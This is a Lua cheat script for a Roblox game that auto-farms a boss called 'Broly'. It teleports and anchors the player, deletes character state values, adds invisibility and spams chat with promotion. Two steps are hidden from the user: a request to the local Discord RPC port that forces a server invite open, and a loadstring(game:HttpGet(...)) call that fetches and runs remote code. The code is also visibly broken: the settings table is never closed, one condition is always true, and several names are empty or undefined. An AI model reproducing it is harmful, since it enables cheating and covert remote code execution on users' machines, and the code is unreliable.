Move1 = "Meteor Crash"
Move2 = "Anger Rush"
Move3 = "God Slicer"
Move4 = "Deadly Dance"

Settings = {
    ["Dimension"] = {
        ["Queue"] = true,
        ["Earth"] = false,
    },
    ["Queue related"] = {
        ["AntiLeach"] = false, -- so if there is someone with you in Broly it will come back to queue/earth
        ["Pad"] = "6", -- 1, 2, 3 ,4 ,5 ,6 ,7 or Random. only for queue
        ["Carry"] = true, -- if true it will put pad to 1 and send messages that said you will carry Broly
    },
    ["Rejoin"] = {
        ["RejoinTime"] = 200,
        ["GrabChecker"] = false, -- will check if you grabbed Broly
    },
    ["Race"] = {
        ["Form"] = true, -- if you want to form or not
        ["ChargeTime"] = 3, -- will not work with Freeze2EXP
        ["LateDroidForm"] = true, -- will still work with Freeze2EXP
    },
    ["Misc"] = {
        ["Invisible"] = false,
        ["Stealth"] = false, -- it will go far in queue/earth to invis, (not to be seen)
        ["FPSBoost"] = false,
        ["Freeze2EXP"] = false, -- you cannot charge with this on, you can still g/h form
        ["HitOtherPlayers"] = false,
        ["LevelStop"] = 2000,
        ["KiOnly"] = false, -- will replace your moves with ki moves. will ki-track broly. will not grab broly. you need a LOT of ki max
    },


---------------------------------------------------------------------------

local broly = 2050207304
local queue = 3565304751
local earth = 536102540

if Settings.Dimension.Queue == true then
    Settings.Dimension.Earth = false
end
if Settings["Queue related"].Carry == true then
    Settings.Misc.Invisible = false
    Settings.Misc.Stealth = false
    Settings["Queue related"].AntiLeach = false
    Settings.Dimension.Earth = false
end
if Settings.Misc.Stealth == true then
    Settings.Misc.Invisible = true
end
if Settings["Queue related"].AntiLeach == true then
    Settings.Misc.Invisible = true
end
if Settings.Race.LateDroidForm == true then
    Settings.Race.ChargeTime = 0
end
if Settings.Misc.KiOnly == true then
    Settings.Rejoin.GrabChecker = false
end

local function kill(path, object)
    for i, v in ipairs(path:GetChildren()) do
        if v.Name == object then
            v:Destroy()
            return true
        end
    end
end

local function tp(id)
    game:GetService("TeleportService"):teleport(id)
end

local function twn(char, time, coords, ...)
    if ... == nil then
        Style = Enum.EasingStyle.Linear
    else
        Style = Enum.EasingStyle[...]
    end
    game:GetService("TweenService"):Create(char, TweenInfo.new(time, Style), {CFrame = coords}):Play()
end

local function notif(Title, Text, ...)
    if ... == nil then
        Duration = 7
    else
        Duration = ...
    end
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = Title,
        Text = Text,
        Duration = Duration}
    )
end

local function rejoin()
    if Settings.Dimension.Queue == true then
        tp(queue)
    else
        tp(earth)
    end
end

local function form()
    local plr = game:GetService("Players").LocalPlayer
    local oldki = plr.Character:WaitForChild("Ki")
    plr.Character:WaitForChild("Race")
    if Settings.Race.LateDroidForm == true and Settings.Race.Form == true then
        coroutine.wrap(function()
            while wait() do
                if plr.Character.Ki.Value <= oldki * 0.5 then
                    plr.Backpack.ServerTraits.Transform:FireServer("g")
                end
            end
        end){}
    elseif Settings.ChargeForm ~= 0 and Settings.Race.Form == true then
        if plr.Character:FindFirstChild("Race") then
            if plr.Character.Race.Value == "Android" then
                plr.Backpack.ServerTraits.Transform:FireServer("g")
            else
                plr.Backpack.ServerTraits.Input:FireServer({[1] = "x"},CFrame.new(0,0,0),InputObject)
                wait(Settings.Race.ChargeTime)
                plr.Backpack.ServerTraits.Transform:FireServer("h")
                wait(.5)
                plr.Backpack.ServerTraits.Input:FireServer({[1] = "xoff"},CFrame.new(0,0,0),InputObject)
            end
        end
    end
end

game.RunService.Stepped:connect(function()
    if game.PlaceId ~= broly then
	    if game.PlaceId ~= queue and Settings.Dimension.Queue == true then
            tp(queue)
        elseif game.PlaceId ~= earth and Settings.Dimension.Earth == true then
            tp(earth)
    	end
	end
end)

repeat
    wait()
until(game:IsLoaded())
repeat
    wait()
until(game.Players.LocalPlayer.Character)
repeat
    wait()
until(game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))

local filename = "new_plr(autobroly).txt"
local json
local HttpService = game:GetService("HttpService")
    if isfile(filename) then
        PlayerName = HttpService:JSONDecode(readfile(filename))
        if PlayerName == game:GetService("Players").LocalPlayer.Name then
            print("welcome back mate")
        end
    else
        if (writefile) then
            json = HttpService:JSONEncode(game:GetService("Players").LocalPlayer.Name)
            writefile(filename, json)
        else
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Executor cannot support this AutoBroly !",
                Text = "NICE"}
            )
            game:GetService("Players").LocalPlayer:Kick("Get krnl or smth bro")
        end
        pcall(function()
            syn.request({
                Url = "http://127.0.0.1:6463/rpc?v=1",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["Origin"] = "https://discord.com"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    cmd = "INVITE_BROWSER",
                    args = {
                        code = "uC9rA8UXV5"
                    },
                    nonce = game:GetService("HttpService"):GenerateGUID(false)
                }),
            })
        end)
    end

if Settings.Misc.FPSBoost == true then
    workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0
    workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0
    workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0
    workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0
    game:GetService("Lighting").GlobalShadows = false
    game:GetService("Lighting").FogEnd = 9e9
    settings().Rendering.QualityLevel = 1
    for i,v in pairs(game:GetDescendants()) do
        if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
        elseif v:IsA("Decal") then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        end
    end
    for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
        if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
            v.Enabled = false
        end
    end
end
local plr = game:GetService("Players").LocalPlayer
local run = game:GetService("RunService")
local cam = game.workspace.CurrentCamera
local idktext = math.random(1, 20)
local pad
local pads = {
    [1] = CFrame.new(-15, 238, -145),
    [2] = CFrame.new(-15, 238, -290),
    [3] = CFrame.new(-15, 238, -422.5),
    [4] = CFrame.new(-15, 238, -588),
    [5] = CFrame.new(-15, 238, -730),
    [6] = CFrame.new(-15, 238, -882.5),
    [7] = CFrame.new(-15, 238, -1050),
}

-- gui
coroutine.wrap(function()
    repeat
        wait()
    until(plr.PlayerGui)
    repeat
        wait()
    until(plr.PlayerGui:FindFirstChild("HUD"))
    repeat
        wait()
    until(plr.PlayerGui.HUD:FindFirstChild("FullSize"))
    coroutine.wrap(function()
        Timer = Settings.Rejoin.RejoinTime
        while wait(1) do
            Timer = Timer - 1
        end
    end){}
    run.Stepped:connect(function()
        local short = plr.PlayerGui.HUD.Bottom.SP
        plr.PlayerGui.HUD.FullSize.Ki.Bar.BackgroundColor3 = Color3.fromRGB(109, 0, 255)
        plr.PlayerGui.HUD.FullSize.Ki.Bar.Shadow.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        plr.PlayerGui.HUD.FullSize.Timer2.Text = "GALAXY AUTO BROLY"
        if plr.PlayerGui.HUD.Bottom.SideMenu:FindFirstChild("LowGfx") then
            plr.PlayerGui.HUD.Bottom.SideMenu.LowGfx:Destroy()
        end
        short.Visible = true
        short.BackgroundColor3 = Color3.new(0, 0, 0)
        short.TextColor3 = Color3.fromRGB(0, 105, 255)
        short.BackgroundTransparency = 0
        if game.PlaceId ~= broly then
            cam.FieldOfView = 60
            if idktext == 1 then short.Text = "Galaxy Broly :)" end
        else
            short.Text = "Broly's Health : "..math.floor(game.Workspace.Live["Broly BR"].Humanoid.Health).." | Rejoin time : "..Timer.." / "..Settings.Rejoin.RejoinTime
        end
    end)
end){}

run.Stepped:connect(function()
    if Settings.Misc["Freeze2EXP"] == true then
        kill(plr.Character, "True")
    end
end)

if game.PlaceId == queue and Settings.Dimension.Queue == true then
    coroutine.wrap(function()
        wait(25)
        notif("Rejoining..", "The Auto Broly is Bug :(.")
        tp(game.PlaceId)
        wait(5)
        notif("Pad is broken.", "You need to wait that the game teleports you", 99999)
    end){}
    run.Stepped:connect(function()
        for i, v in ipairs(plr.Character:GetChildren()) do
            if v.Name == "PowerOutput" or v.ClassName == "Model" then
                v:Destroy()
            end
            if v.Name == "RebirthWings" then
                if v:FindFirstChild("Handle") then
                    v.Handle:Destroy()
                end
            end
        end
    end)
    if Settings.Misc.Invisible == true then
        if Settings.Misc["Stealth"] == true then
            twn(plr.Character.HumanoidRootPart, .1, CFrame.new(-90, 5593, -519))
            wait(.1)
            plr.Character.Head.Anchored = true
        end
        kill(plr.Character, "RightLowerLeg")
        kill(plr.Character, "LeftLowerLeg")
        kill(plr.Character, "RightFoot")
        kill(plr.Character, "LeftFoot")
        kill(plr.Character, "LowerTorso")
        kill(plr.Character, "RightUpperLeg")
        kill(plr.Character, "LeftUpperLeg")
        wait(.1)
    end
    if Settings["Queue related"].Pad == "1" or "2" then
        pad = math.random(1, 7)
    else
        pad = tonumber(Settings["Queue related"].Pad)
    end
    if Settings["Queue related"].Carry == true then
        pad = 1
    end
    coroutine.wrap(function()
        while wait() do
            if Settings["Queue related"].Carry == true then
                if Settings.Misc.KiOnly == true then
                    local args = {
                        [1] = plr.Name.."'s AUTO BROLY MADE BY GALAXY TP TO ME I CARRY",
                        [2] = "All"
                    }
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
                    wait(2.3)
                    local args = {
                        [1] = "Auto Broly By Galaxy V11.5 TP TO ME I CARRY",
                        [2] = "All"
                    }
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
                    wait(2.3)
                else
                    local args = {
                        [1] = plr.Name.."'s AUTO BROLY MADE BY GALAXY TP TO ME I CARRY",
                        [2] = "All"
                    }
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
                    wait(2.3)
                end
            else
                break
            end
        end
    end){}
    twn(plr.Character.HumanoidRootPart, .1, pads[pad])
    wait(.2)
    run.Stepped:connect(function()
        plr.Character.HumanoidRootPart.CFrame = pads[pad]
        plr.Character.HumanoidRootPart.Anchored = true
    end)
elseif game.PlaceId == earth and Settings.Dimension.Earth == true then
    coroutine.wrap(function()
        wait(45)
        notif("Rejoining..", "Galaxy The Auto broly is Bug.")
        tp(game.PlaceId)
    end){}
    run.Stepped:connect(function()
        for i, v in ipairs(plr.Character:GetChildren()) do
            if v.Name == "PowerOutput" or v.ClassName == "Model" then
                v:Destroy()
            end
            if v.Name == "RebirthWings" then
                if v:FindFirstChild("Handle") then
                    v.Handle:Destroy()
                end
            end
        end
    end)
    if Settings.Misc.Invisible == true then
        if Settings.Misc["Stealth"] == true then
            twn(plr.Character.HumanoidRootPart, .1, CFrame.new(-1601.49, 238, -83.622))
            wait(.1)
        end
        kill(plr.Character, "RightLowerLeg")
        kill(plr.Character, "LeftLowerLeg")
        kill(plr.Character, "RightFoot")
        kill(plr.Character, "LeftFoot")
        kill(plr.Character, "LowerTorso")
        kill(plr.Character, "RightUpperLeg")
        kill(plr.Character, "LeftUpperLeg")
        wait(.1)
    end
    twn(plr.Character.HumanoidRootPart, .1, CFrame.new(2753, 3945, -2286))
    wait(.2)
    run.Stepped:connect(function()
        plr.Character.HumanoidRootPart.CFrame = CFrame.new(2753, 3945, -2286)
        plr.Character.HumanoidRootPart.Anchored = true
    end)
end

if game.PlaceId == broly then
    coroutine.wrap(function()
        wait(Settings.Rejoin.RejoinTime)
        notif("Rejoin Time elapsed", "Rejoining")
        wait(.5)
        rejoin()
    end){}
    --promote chat ;)
    coroutine.wrap(function()
        wait(1)
        local args = {[1] = "Galaxy-Auto-Broly-V1.",[2] = "All"}
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
        wait(2)
        loadstring(game:HttpGet("...", true))()
    end){}
    run.Stepped:connect(function()
        if Settings["Queue related"].AntiLeach == true then
            if #game.Players:GetPlayers() > 1 then
                rejoin()
            end
        end
        for i, v in ipairs(plr.Character:GetChildren()) do
            if v.ClassName == "Model" then
                v:Destroy()
            end
            if Settings.Misc["HitOtherPlayers"] == true then
                kill(plr.Character, "team damage")
            end
            if v.Name == "RebirthWings" then
                if v:FindFirstChild("Handle") then
                    v.Handle:Destroy()
                end
            end
        end
    end)
    form()
    local BrolyBR = game.workspace.Live["Broly BR"]
    cam.FieldOfView = 60
    twn(plr.Character.HumanoidRootPart, .1, BrolyBR.HumanoidRootPart.CFrame)
    wait(.1)
    run.Stepped:connect(function()
        if Settings.Misc.KiOnly == false then
            cam.CameraType = "Scriptable"
            cam.CFrame = CFrame.new(-10.5139179, -122.32222, 40.9318542, 0.992745161, -0.00252069603, 0.120211452, -0, 0.999780238, 0.0209642407, -0.120237887, -0.0208121482, 0.992526)
        end
        if BrolyBR.Humanoid.Health <= 0 then
            notif("Broly died!", "Rejoining..")
            rejoin()
        elseif plr.Character.Humanoid.Health <= 0 then
            notif("You died!", "Rejoining..")
            rejoin()
        end
        if Settings.Misc.KiOnly == true then
            Move1 = "Chain Destructo Disk"
            Move11 = "Blaster Meteor"

            plr.Character.HumanoidRootPart.CFrame = BrolyBR.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
        else
            plr.Character.HumanoidRootPart.CFrame = BrolyBR.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0)
        end
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v.Name == "Block" then
                v.Value = false
            end
            if v.Name == "Action" or v.Name == "Activity" or v.Name == "Attacking" or v.Name == "Using" or v.Name == "hyper" or v.Name == "Hyper" or v.Name == "KiBlasted" or v.Name == "heavy" or v.Name == "NotHardBack" or v.Name == "Tele" or v.Name == "Blocked" or v.Name == "tele" or v.Name == "Killed" or v.Name == "Slow" then
                v:Destroy()
            end
        end
    end)
        -- this is here so the character doesn't loop fall when he isn't flying, makes the autotop better, faster, smoother and nicer to look att
        local part = Instance.new("Part", game.workspace)
        part.Anchored = true
        part.Transparency = 1
    if Settings.Misc.KiOnly == false then
        plr.Backpack:WaitForChild("")
        plr.Character.Humanoid:EquipTool(plr.Backpack[""])
        plr.Character:WaitForChild("")
        plr.Character[""]:WaitForChild("Activator")
        plr.Character[""].Activator:WaitForChild("Flip")
        kill(plr.Character[""].Activator, "Flip")
        if Settings.Rejoin.GrabChecker == true then
            coroutine.wrap(function()
                wait(5)
                if not BrolyBR:FindFirstChild("MoveStart") then
                    if Settings.Rejoin.GrabChecker == true then
                        notif("You didn't grabbed broly!", "Rejoining...")
                        wait(.5)
                        rejoin()
                    end
                end
            end){}
            repeat wait()
                if plr.Character:FindFirstChild("Dragon Crush") then
                    plr.Character["Dragon Crush"]:Activate()
                end
            until(BrolyBR:FindFirstChild("MoveStart"))
        else
            plr.Character[""]:Activate()
        end
        wait(.2)
    end

    coroutine.wrap(function()
        while wait() do
            if Settings.Misc.KiOnly == true then
                for idk, kimove in ipairs(game.workspace:GetChildren()) do
                    if kimove:FindFirstChild("Ki") and kimove:FindFirstChild("Mesh") then
                        kimove.CFrame = BrolyBR.HumanoidRootPart.CFrame
                    end
                end
                for idk, kimove in ipairs(plr.Character:GetChildren()) do
                    if kimove:FindFirstChild("Ki") and kimove:FindFirstChild("Mesh") then
                        kimove.CFrame = BrolyBR.HumanoidRootPart.CFrame
                    end
                end
            end
        end
    end){}

    run.Stepped:connect(function()
        if Settings.Rejoin.GrabChecker == true then
            if BrolyBR:FindFirstChild("MoveStart") then
                part.Position = plr.Character.HumanoidRootPart.CFrame * Vector3.new(0, -3, 0)
                if Settings.Misc.KiOnly == false then
                    BrolyBR.LowerTorso.Anchored = true
                end
                if plr.Character.Ki.Value <= 60 then
                    function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end
                    local args = {[1] = {[1] = "m2"},[2] = CFrame.new(Vector3.new(-488.6631774902344, 21.987539291381836, -6421.82275390625), Vector3.new(0.9675005674362183, -0.23425693809986115, 0.09521802514791489)),[3] = getNil("InputObject", "InputObject"),[4] = false}
                    game:GetService("Players").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack(args))
                end
                for i, v in pairs(plr.Backpack:GetChildren()) do
                    if v.Name == Move1 or v.Name == Move2 or v.Name == Move3 or v.Name == Move4 or v.Name == Move5 or v.Name == Move6 or v.Name == Move7 or v.Name == Move8 or v.Name == Move9 or v.Name == Move10 or v.Name == Move11 or v.Name == Move12 or v.Name == Move13 or v.Name == Move14 then
                        v.Parent = plr.Character
                        v:Activate()
                        v:Deactivate()
                        wait()
                        v.Parent = plr.Backpack
                        plr.Backpack.ServerTraits.EatSenzu:FireServer("")
                    end
                end
            end
        else
            part.Position = plr.Character.HumanoidRootPart.CFrame * Vector3.new(0, -3, 0)
            if Settings.Misc.KiOnly == false then
                BrolyBR.LowerTorso.Anchored = true
            end
            if plr.Character.Ki.Value <= 60 then
                function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end
                local args = {[1] = {[1] = "m2"},[2] = CFrame.new(Vector3.new(-488.6631774902344, 21.987539291381836, -6421.82275390625), Vector3.new(0.9675005674362183, -0.23425693809986115, 0.09521802514791489)),[3] = getNil("InputObject", "InputObject"),[4] = false}
                game:GetService("Players").LocalPlayer.Backpack.ServerTraits.Input:FireServer(unpack(args))
            end
            for i, v in pairs(plr.Backpack:GetChildren()) do
                if v.Name == Move1 or v.Name == Move2 or v.Name == Move3 or v.Name == Move4 or v.Name == Move5 or v.Name == Move6 or v.Name == Move7 or v.Name == Move8 or v.Name == Move9 or v.Name == Move10 or v.Name == Move11 or v.Name == Move12 or v.Name == Move13 or v.Name == Move14 then
                    v.Parent = plr.Character
                    v:Activate()
                    v:Deactivate()
                    wait()
                    v.Parent = plr.Backpack
                    plr.Backpack.ServerTraits.EatSenzu:FireServer("")
                end
            end
        end
    end)
end